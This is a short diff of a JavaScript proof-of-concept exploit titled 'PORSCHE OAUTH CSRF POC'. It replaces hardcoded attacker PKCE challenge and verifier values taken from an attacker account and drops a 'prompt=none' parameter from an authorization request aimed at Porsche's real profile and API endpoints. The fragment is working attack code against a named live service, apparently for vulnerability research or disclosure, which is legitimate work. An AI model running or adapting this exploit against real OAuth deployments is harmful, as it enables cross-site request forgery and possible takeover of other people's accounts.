@@ -299,8 +299,8 @@
         // ===================================================================
         // ATTACKER'S PKCE CREDENTIALS (Fresh from Account A)
         // ===================================================================
-        const ATTACKER_CODE_CHALLENGE = 'geI6p69v6waeTb-zUZeqMq9WhOK4KWDeWSz_RPWWzB0';
-        const ATTACKER_CODE_VERIFIER = 'lRf1HFPCWyjLDD5C110g_GTMF0HeHlAJ-Xiyw23a0f_';
+        const ATTACKER_CODE_CHALLENGE = 'GmeSLfiYZdoWUq5uT-pDo2SG2oSdA2inWl0wCZagQT8';
+        const ATTACKER_CODE_VERIFIER = 'hgOAH9itlSHSa9sMrEGmEnKvMItB03eC9COrAQPGwRR';
         const ATTACKER_NONCE = 'LivePoC_' + Date.now();
         
         console.log('=== PORSCHE OAUTH CSRF POC ===');
@@ -316,7 +316,6 @@
             'scope=openid+email+profile&' +
             'redirect_uri=https://profile.porsche.com/myprofile/auth/callback&' +
             'audience=https://api.porsche.com&' +
-            'prompt=none&' +
             'response_type=code&' +
             'response_mode=web_message&' +
             'nonce=' + ATTACKER_NONCE + '&' +
